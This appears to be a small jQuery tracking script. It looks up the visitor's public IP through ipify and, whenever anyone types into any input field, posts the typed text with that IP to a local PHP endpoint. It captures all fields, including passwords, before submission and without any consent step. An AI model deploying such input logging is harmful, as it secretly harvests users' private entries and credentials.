var sessionId;
$.getJSON("https://api.ipify.org?format=json", function (data) {
  sessionId = data.ip;
  //console.log(sessionId);
});

$( document ).ready(function() {

	var Timer;

	//Listeners
	$('input').on('input', function(){
		var entry=$(this).val();
		clearTimeout(Timer);
		Timer = setTimeout(function () {
		if (entry.length > 2) {
			sendTrackerInfo("input", entry);
		}
		}, 1500);
	});
	
});

function sendTrackerInfo(type, value){
$.post(
  "php/insertTracker.php",
  {
    sessionId: sessionId,
    type: type,
    value: value,
  },
  function (data) {
    console.log(data);
  }
);
};